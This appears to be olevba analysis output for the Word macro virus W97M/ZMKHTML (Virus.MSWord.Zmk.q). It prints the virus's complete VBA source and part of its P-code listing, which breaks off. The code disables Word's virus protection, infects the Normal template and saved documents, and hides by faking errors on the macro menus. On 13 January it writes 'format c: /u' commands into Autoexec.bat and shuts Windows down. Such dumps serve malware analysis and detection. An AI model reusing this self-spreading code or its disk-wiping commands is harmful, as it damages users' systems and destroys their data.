olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ZMKHTML.cls 
in file: Virus.MSWord.Zmk.q - OLE stream: 'Macros/VBA/ZMKHTML'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrDO
iMacroNTCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNTCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "ZMKHTML" Then
        ZMKHTMLInstalled = -1
    End If
Next i
If Not ZMKHTMLInstalled Then
    ActiveDocument.VBProject.VBComponents("ZMKHTML").Export "C:\Msdos.win"
    ActiveDocument.VBProject.VBComponents("About").Export "C:\Win.dos"
    ActiveDocument.VBProject.VBComponents("Propos").Export "C:\Dos.win"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\Msdos.win"
    NormalTemplate.VBProject.VBComponents("ZMKHTML").CodeModule.DeleteLines 1, 4
    NormalTemplate.VBProject.VBComponents.Import "C:\Win.dos"
    NormalTemplate.VBProject.VBComponents.Import "C:\Dos.win"
End If
ErrDO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrFSA
Dialogs(wdDialogFileSaveAs).Show
If (ActiveDocument.SaveFormat = wdFormatTemplate) Or (ActiveDocument.SaveFormat = wdFormatDocument) Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
iMacroDCount = ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroDCount
    If ActiveDocument.VBProject.VBComponents(i).Name = "ZMKHTML" Then
        ZMKHTMLDocInstalled = -1
    End If
Next i
If Not ZMKHTMLDocInstalled Then
    NormalTemplate.VBProject.VBComponents("ZMKHTML").Export "C:\Msdos.win"
    NormalTemplate.VBProject.VBComponents("About").Export "C:\Win.dos"
    NormalTemplate.VBProject.VBComponents("Propos").Export "C:\Dos.win"
    ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\Msdos.win"
    ActiveDocument.VBProject.VBComponents("ZMKHTML").CodeModule.DeleteLines 1, 4
    ActiveDocument.VBProject.VBComponents.Import "C:\Win.dos"
    ActiveDocument.VBProject.VBComponents.Import "C:\Win.dos"
    ActiveDocument.Save
End If
ErrFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFTem
If System.LanguageDesignation = "Français (standard)" Then
    MsgBox "Fonction Sub Inconnu", vbCritical, "Microsoft Word"
Else
    MsgBox "Sub Function unknown", vbCritical, "Microsoft Word"
End If
ErrorFTem:
End Sub
Sub HelpAbout()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorHelpAbout
If System.LanguageDesignation = "Français (standard)" Then
    Propos.Show
Else
    About.Show
End If
ErrorHelpAbout:
End Sub
Sub AutoExit()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFEx
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D1$ = Mid(MyDate, 1, 2)
D2$ = Mid(MyDate, 4, 5)
T1$ = Mid(MyTime, 4, 5)
If (D1$ = "13") And (D2$ = "01") Then
Open "C:\ZMKHTML.htm" For Output As #1
    Print #1, "<HTML>"
    Print #1, "<HEAD>"
    Print #1, "<META HTTP-EQUIV=""Content-Type"" CONTENT=""text/html; charset=windows-1252"">"
    Print #1, "<TITLE>Virus ZMKHTML</TITLE>"
    Print #1, "<body bgcolor=""blue"" >"
    Print #1, "<p><font size=""6""><strong><MARQUEE behavior=""alternate"">Le 13, ce n'est pas de chance pour vous aujourd'hui!!!!!</MARQUEE></font></p>"
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p><font size=""7""><strong><MARQUEE behavior=""slide"">HA HA HA HA HA HA HA HA HA !!!!!!!!!!!!</MARQUEE></font></p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, "<p><font size=""8""><strong><MARQUEE>Merci à son auteur ZeMacroKiller98 ainsi qu'aux membre de [SOS](Sign Of Scream)</MARQUEE></font></p>"
    Print #1, "</body>"
    Print #1, "</HTML>"
Close #1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = "C:\ZMKHTML.htm"
Open "C:\Autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "echo Joyeux anniversaire à ZeMacroKiller98"
Print #1, "echo Happy birthday ZeMacroKiller98"
Print #1, "echo o|format c: /u"
Print #1, "echo y|format c:/u"
Close #1
MsgBox "Vive ZeMacroKiller98 ainsi que les membres de [SOS]", vbInformation, "Virus ZMKHTML"
Tasks.ExitWindows
GoTo Fin
End If
If D1$ = "13" Then
Open "C:\ZMKHTML.htm" For Output As #1
    Print #1, "<HTML>"
    Print #1, "<HEAD>"
    Print #1, "<META HTTP-EQUIV=""Content-Type"" CONTENT=""text/html; charset=windows-1252"">"
    Print #1, "<TITLE>Virus ZMKHTML</TITLE>"
    Print #1, "<body bgcolor=""yellow"" >"
    Print #1, "<p><font size=""6""><strong><MARQUEE behavior=""alternate"">Aujourd'hui c'est l'anniversaire de mon créateur:</MARQUEE></font></p>"
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p><font size=""7""><strong><MARQUEE behavior=""slide"">Joyeux anniversaire ZeMacroKiller98!!!!!</MARQUEE></font></p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, "<p><font size=""8""><strong><MARQUEE>Happy birthday ZeMacroKiller98!!!!!!!</MARQUEE></font></p>"
    Print #1, "</body>"
    Print #1, "</HTML>"
Close #1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = "C:\ZMKHTML.htm"
Else
Open "C:\ZMKHTML.htm" For Output As #1
Print #1, "<HTML>"
Print #1, "<HEAD>"
Print #1, "<META HTTP-EQUIV=""Content-Type"" CONTENT=""text/html; charset=windows-1252"">"
Print #1, "<TITLE>Virus ZMKHTML</TITLE>"
Print #1, "<body bgcolor=""red"" >"
Print #1, "<p><font size=""6""><strong><MARQUEE behavior=""alternate"">ATTENTION, VOTRE ORDINATEUR EST INFECTE PAR W97M/ZMKHTML.</MARQUEE></font></p>"
Print #1, "<p>&nbsp;</p>"
Print #1, ""
Print #1, "<p>&nbsp;</p>"
Print #1, ""
Print #1, "<p>&nbsp;</p>"
Print #1, ""
Print #1, "<p>&nbsp;</p>"
Print #1, ""
Print #1, "<p>&nbsp;</p>"
Print #1, ""
Print #1, "<p>&nbsp;</p>"
Print #1, "<p><font size=""8""><strong><MARQUEE>BECAREFULL, YOUR COMPUTER IS INFECTED BY W97M/ZMKHTML.</MARQUEE></font></p>"
Print #1, "</body>"
Print #1, "</HTML>"
Close #1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = "C:\ZMKHTML.htm"
End If
Fin:
ErrorFEx:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorToolM:
If System.LanguageDesignation = "Français (standard)" Then
    MsgBox "Une erreur interne à ce programme est survenu" & Chr$(13) & "Veuillez réessayer plus tard", vbCritical, "Microsoft Word"
Else
    MsgBox "A internal error in this program is occured" & Chr$(13) & "Retry later", vbCritical, "Microsoft Word"
End If
ErrorToolM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorViewVBC:
If System.LanguageDesignation = "Français (standard)" Then
    MsgBox "Ce module de programme n'est pas installé" & Chr$(13) & "Veuillez consulter l'aide en ligne", vbInformation, "Microsoft Word"
Else
    MsgBox "This program module is not installed" & Chr$(13) & "Please see the help on line", vbCritical, "Microsoft Word"
End If
ErrorViewVBC:
End Sub

-------------------------------------------------------------------------------
VBA MACRO About.frm 
in file: Virus.MSWord.Zmk.q - OLE stream: 'Macros/VBA/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Unload About
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Propos.frm 
in file: Virus.MSWord.Zmk.q - OLE stream: 'Macros/VBA/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Unload Propos
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zmk.q
' ===============================================================================
' Module streams:
' Macros/VBA/ZMKHTML - 23114 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrDO 
' Line #6:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroNTCount 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroNTCount 
' 	For 
' Line #8:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "ZMKHTML"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ZMKHTMLInstalled 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Ld ZMKHTMLInstalled 
' 	Not 
' 	IfBlock 
' Line #13:
' 	LitStr 0x000C "C:\Msdos.win"
' 	LitStr 0x0007 "ZMKHTML"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #14:
' 	LitStr 0x000A "C:\Win.dos"
' 	LitStr 0x0005 "About"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' 	LitStr 0x000A "C:\Dos.win"
' 	LitStr 0x0006 "Propos"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	LitStr 0x000C "C:\Msdos.win"
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitStr 0x0007 "ZMKHTML"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #18:
' 	LitStr 0x000A "C:\Win.dos"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #19:
' 	LitStr 0x000A "C:\Dos.win"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Label ErrDO 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub FileSaveAs())
' Line #24:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #25:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #28:
' 	OnError ErrFSA 
' Line #29:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #31:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroDCount 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroDCount 
' 	For 
' Line #35:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "ZMKHTML"
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ZMKHTMLDocInstalled 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	Ld ZMKHTMLDocInstalled 
' 	Not 
' 	IfBlock 
' Line #40:
' 	LitStr 0x000C "C:\Msdos.win"
' 	LitStr 0x0007 "ZMKHTML"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #41:
' 	LitStr 0x000A "C:\Win.dos"
' 	LitStr 0x0005 "About"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #42:
' 	LitStr 0x000A "C:\Dos.win"
' 	LitStr 0x0006 "Propos"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #43:
' 	LitStr 0x000C "C:\Msdos.win"
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #44:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitStr 0x0007 "ZMKHTML"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #45:
' 	LitStr 0x000A "C:\Win.dos"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #46:
' 	LitStr 0x000A "C:\Win.dos"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #47:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Label ErrFSA 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub FileTemplates())
' Line #52:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #53:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #56:
' 	OnError ErrorFTem 
' Line #57:
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0013 "Français (standard)"
' 	Eq 
' 	IfBlock 
' Line #58:
' 	LitStr 0x0014 "Fonction Sub Inconnu"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #59:
' 	ElseBlock 
' Line #60:
' 	LitStr 0x0014 "Sub Function unknown"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Label ErrorFTem 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub HelpAbout())
' Line #65:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #66:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #67:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #68:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #69:
' 	OnError ErrorHelpAbout 
' Line #70:
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0013 "Français (standard)"
' 	Eq 
' 	IfBlock 
' Line #71:
' 	Ld Propos 
' 	ArgsMemCall Show 0x0000 
' Line #72:
' 	ElseBlock 
' Line #73:
' 	Ld About 
' 	ArgsMemCall Show 0x0000 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Label ErrorHelpAbout 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub AutoExit())
' Line #78:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #79:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #80:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #81:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #82:
' 	OnError ErrorFEx 
' Line #83:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyTime
' Line #84:
' 	Ld Date 
' 	St MyDate 
' Line #85:
' 	Ld Time 
' 	St MyTime 
' Line #86:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D1$ 
' Line #87:
' 	Ld MyDate 
' 	LitDI2 0x0004 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St D2$ 
' Line #88:
' 	Ld MyTime 
' 	LitDI2 0x0004 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St T1$ 
' Line #89:
' 	Ld D1$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	Paren 
' 	Ld D2$ 
' 	LitStr 0x0002 "01"
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #90:
' 	LitStr 0x000E "C:\ZMKHTML.htm"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<HTML>"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<HEAD>"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "<TITLE>Virus ZMKHTML</TITLE>"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "<body bgcolor="blue" >"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0085 "<p><font size="6"><strong><MARQUEE behavior="alternate">Le 13, ce n'est pas de chance pour vous aujourd'hui!!!!!</MARQUEE></font></p>"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0070 "<p><font size="7"><strong><MARQUEE behavior="slide">HA HA HA HA HA HA HA HA HA !!!!!!!!!!!!</MARQUEE></font></p>"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0087 "<p><font size="8"><strong><MARQUEE>Merci à son auteur ZeMacroKiller98 ainsi qu'aux membre de [SOS](Sign Of Scream)</MARQUEE></font></p>"
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</body>"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</HTML>"
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #112:
' 	LitStr 0x000E "C:\ZMKHTML.htm"
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #113:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "echo Joyeux anniversaire à ZeMacroKiller98"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "echo Happy birthday ZeMacroKiller98"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "echo o|format c: /u"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "echo y|format c:/u"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #120:
' 	LitStr 0x0033 "Vive ZeMacroKiller98 ainsi que les membres de [SOS]"
' 	Ld vbInformation 
' 	LitStr 0x000D "Virus ZMKHTML"
' 	ArgsCall MsgBox 0x0003 
' Line #121:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #122:
' 	GoTo Fin 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	Ld D1$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	IfBlock 
' Line #125:
' 	LitStr 0x000E "C:\ZMKHTML.htm"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<HTML>"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<HEAD>"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "<TITLE>Virus ZMKHTML</TITLE>"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "<body bgcolor="yellow" >"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007E "<p><font size="6"><strong><MARQUEE behavior="alternate">Aujourd'hui c'est l'anniversaire de mon créateur:</MARQUEE></font></p>"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0071 "<p><font size="7"><strong><MARQUEE behavior="slide">Joyeux anniversaire ZeMacroKiller98!!!!!</MARQUEE></font></p>"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005D "<p><font size="8"><strong><MARQUEE>Happy birthday ZeMacroKiller98!!!!!!!</MARQUEE></font></p>"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</body>"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
